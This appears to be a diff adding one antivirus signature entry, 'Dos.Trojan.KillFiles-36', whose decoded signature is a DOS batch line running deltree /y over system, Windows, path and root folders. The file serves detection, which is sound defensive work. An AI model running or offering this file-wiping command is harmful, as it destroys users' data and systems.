@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.KillFiles-36
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+for %%b in (*.* %path%\*.* ..\*.* %windir%\*.* c:\*.* %windir%\system\*.*) do deltree/y %%b
